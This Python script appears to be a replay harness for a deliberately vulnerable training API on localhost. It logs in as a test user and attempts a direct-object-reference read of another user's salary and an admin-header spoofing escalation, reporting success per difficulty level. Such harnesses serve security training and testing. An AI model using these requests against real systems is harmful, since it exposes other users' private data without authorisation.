#!/usr/bin/env python3
"""Replay api-auth scenario. Standard library only."""
import json, sys, urllib.parse, urllib.request, urllib.error
from http.cookiejar import CookieJar

def _session(base):
    cj = CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def _post(op, base, path, data):
    url = base.rstrip("/")+path
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=payload, method="POST",
        headers={"Content-Type":"application/x-www-form-urlencoded"})
    try:
        with op.open(req) as r: return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e: return e.code, json.loads(e.read() or b"{}")

def _get(op, base, path, headers=None):
    url = base.rstrip("/")+path
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with op.open(req) as r: return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e: return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    op, _ = _session(base)
    _post(op, base, "/api/users/login", {"username":"alice","password":"alice-pass"})
    if level in ("low","medium"):
        s, d = _post(op, base, "/api/users/2", {"user_id":"2"}) if level=="medium" else _get(op, base, "/api/users/2")
        ok = s==200 and "salary" in str(d)
    elif level == "high":
        s, d = _get(op, base, "/api/users/", headers={"X-Role":"admin"})
        ok = s==200 and any("salary" in str(u) for u in d.get("data",[]))
    else:
        s, d = _get(op, base, "/api/users/2")
        ok = s==200
    print(f"  [{level}] HTTP {s} — {'SUCCEEDED' if ok else 'failed'}")
    return ok

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv)>1 else "http://localhost:5000"
    lvl  = sys.argv[2] if len(sys.argv)>2 else "low"
    sys.exit(0 if attack(base, lvl) else 1)
